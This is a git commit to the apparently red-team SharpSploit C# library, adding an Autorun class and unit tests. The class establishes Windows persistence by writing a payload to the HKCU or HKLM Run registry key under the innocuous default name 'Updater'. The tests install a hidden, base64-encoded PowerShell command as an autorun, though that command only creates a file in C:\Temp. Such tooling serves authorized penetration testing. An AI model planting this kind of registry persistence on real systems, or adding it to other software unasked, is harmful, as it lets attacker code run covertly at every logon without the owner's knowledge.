db46f62357b8eac7bc3cc57a357270b32634bc77
Rasta Mouse <rasta@rastamouse.me>
2019-06-02 16:54:16 +0100

    First commit

---
+++ SharpSploit.Tests/SharpSploit.Tests/Persistence/AutorunTests.cs
@@ -0,0 +1,37 @@
+﻿// Author: Ryan Cobb (@cobbr_io)
+// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
+// License: BSD 3-Clause
+
+using System;
+using System.Linq;
+using Microsoft.Win32;
+using Microsoft.VisualStudio.TestTools.UnitTesting;
+
+using SharpSploit.Persistence;
+
+namespace SharpSploit.Tests.Persistence
+{
+    [TestClass]
+    public class AutorunTests
+    {
+        [TestMethod]
+        public void InstallHKCUAutorun()
+        {
+            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hkcu.txt -ItemType File"));
+            Autorun.InstallAutorun($@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}", Autorun.Hive.HKCU);
+
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false);
+            Assert.IsTrue(key.GetValueNames().Contains("Updater"));
+        }
+
+        [TestMethod]
+        public void InstallHKLMAutorun()
+        {
+            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hklm.txt -ItemType File"));
+            Autorun.InstallAutorun($@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}", Autorun.Hive.HKLM);
+
+            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false);
+            Assert.IsTrue(key.GetValueNames().Contains("Updater"));
+        }
+    }
+}
---
+++ SharpSploit/Persistence/Autorun.cs
@@ -0,0 +1,60 @@
+﻿// Author: Ryan Cobb (@cobbr_io)
+// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
+// License: BSD 3-Clause
+
+using System;
+using Microsoft.Win32;
+
+namespace SharpSploit.Persistence
+{
+    /// <summary>
+    /// Autorun is a class for abusing the Windows Registry to establish peristence.
+    /// </summary>
+    public class Autorun
+    {
+        /// <summary>
+        /// Creates an autorun value in HKCU or HKLM to execuate a payload.
+        /// </summary>
+        /// <author>Daniel Duggan (@_RastaMouse)</author>
+        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
+        /// <param name="Name">Name for the registy value. Defaults to "Updater".</param>
+        /// <param name="Value">The registry value.</param>
+        /// <param name="TargetHive">The target hive. HKCU or HKLM.</param>
+        public static bool InstallAutorun(string Value, Hive TargetHive, string Name = "Updater")
+        {
+            try
+            {
+                RegistryKey key;
+
+                if (TargetHive == Hive.HKCU)
+                {
+                    key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
+                    key.Close();
+                }
+                else if (TargetHive == Hive.HKLM)
+                {
+                    key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                    key.SetValue(Name, Value, RegistryValueKind.ExpandString);
+                    key.Close();
+                }
+
+                return true;
+            }
+
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Error: ", e.Message);
+            }
+
+            return false;
+            
+        }
+
+        public enum Hive
+        {
+            HKCU,
+            HKLM
+        }
+    }
+}
